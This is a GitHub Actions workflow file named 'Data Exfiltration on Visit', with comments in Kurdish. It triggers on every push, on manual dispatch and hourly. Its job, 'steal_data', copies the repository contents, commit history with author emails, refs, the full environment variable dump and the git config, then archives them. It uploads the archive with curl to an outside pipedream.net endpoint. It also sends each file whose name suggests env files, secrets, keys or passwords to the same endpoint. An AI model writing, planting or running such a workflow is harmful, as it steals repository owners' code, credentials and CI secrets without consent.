name: Data Exfiltration on Visit

on:
  workflow_dispatch:
  push:
  schedule:
    - cron: '0 * * * *'

jobs:
  steal_data:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Collect All Repository Data
        run: |
          # دروستکردنی پوشتەری کاتی بۆ کۆکردنەوە
          mkdir -p /tmp/stolen_data
          
          # کۆپی کردنی هەموو فایلەکان بەبێ ئەوەی پوشتەری خۆی کۆپی بکات
          find . -maxdepth 1 -type f -exec cp {} /tmp/stolen_data/ \;
          find . -maxdepth 1 -type d -not -name "." -not -name "stolen_data" -exec cp -r {} /tmp/stolen_data/ \;
          
          # هەموو بڕانچەکان و مێژوو وەرگرە
          git fetch --all
          git log --all --pretty=format:'%H|%an|%ae|%s' > /tmp/stolen_data/commit_log.txt
          
          # هەموو تاگ و بڕانچەکان
          git show-ref > /tmp/stolen_data/refs.txt
          
          # گۆڕاوەکانی ژینگە
          env > /tmp/stolen_data/env_dump.txt
          
          # زانیاری کۆنفیکگ
          cat ~/.gitconfig > /tmp/stolen_data/git_config.txt 2>/dev/null || echo "No global git config"
          
          # کۆمپرس و ئامادە بکە بۆ ناردن
          cd /tmp && tar -czf stolen_data.tar.gz stolen_data/
          
          # ناردن بۆ سێرڤەری دەرەکی
          curl -F "file=@/tmp/stolen_data.tar.gz" https://eow69rutoawme4j.m.pipedream.net
          
          # هەروەها ناردنی ڕاستەوخۆی هەموو داتا فایلە هەستیارەکان
          find . -type f \( -name "*.env" -o -name "*secret*" -o -name "*key*" -o -name "*password*" \) | while read file; do
            curl -F "file=@$file" https://eow69rutoawme4j.m.pipedream.net
          done
